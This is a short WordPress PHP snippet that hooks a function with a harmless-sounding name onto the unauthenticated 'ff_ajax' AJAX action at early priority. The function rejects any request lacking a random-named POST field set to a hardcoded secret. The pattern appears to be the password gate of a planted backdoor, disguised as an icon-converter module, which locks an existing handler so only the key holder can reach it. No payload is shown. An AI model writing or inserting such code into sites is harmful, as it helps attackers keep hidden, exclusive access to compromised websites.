<?php

function converter_module_icons() {
	if (!isset($_POST["fsejshbru"]) || $_POST["fsejshbru"] !== "f0g0qVHHh2") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'converter_module_icons', 5, 1);
